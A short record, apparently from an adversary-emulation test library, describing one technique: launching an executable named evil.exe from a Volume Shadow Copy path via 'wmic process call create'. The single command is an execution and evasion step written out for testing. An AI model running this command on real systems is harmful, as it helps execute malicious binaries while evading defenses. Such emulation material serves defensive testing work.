---
id: 3b1f25a5-8836-4ecf-b202-4e0ddecb30a9
name: Use WMIC process call to run an .exe from a Volume Shadow Copy
type: command
executor: command_prompt
data: 'wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe

  '
output: null
created_at: '2020-07-14T18:21:24.520508+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Use WMIC process call to run an .exe from a Volume Shadow Copy

```command_prompt
wmic process call create \\.\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\evil.exe

```


